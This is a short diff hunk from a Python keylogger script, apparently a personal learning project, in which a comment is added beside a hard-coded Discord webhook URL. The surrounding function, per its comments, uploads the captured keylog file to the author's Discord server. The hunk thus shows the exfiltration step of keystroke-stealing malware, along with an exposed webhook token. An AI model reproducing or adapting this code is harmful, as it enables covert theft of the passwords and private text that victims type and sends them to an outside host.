@@ -22,7 +22,7 @@ def keyPressed(key):
 
 #creating the function to send the keylogs to my discord server. Putting the hard link is not best practice and should be hidden    
 def send_file_to_discord(doc): # however I will not worry about hiding the link because this script won't be used in a real scenario
-    discord = "https://discord.com/api/webhooks/1337178495096459426/84dAVFAb_VzFEEVT4ciWkagS3v5JVqGr34EOpiWOkzmSIZ2erxQ33yV7nMxVYLCELn9o"
+    discord = "https://discord.com/api/webhooks/1337178495096459426/84dAVFAb_VzFEEVT4ciWkagS3v5JVqGr34EOpiWOkzmSIZ2erxQ33yV7nMxVYLCELn9o" #change this with your own if you want to use
     try:
         with open(doc, "rb") as file:
 #to send files to discord we must put it in a dict
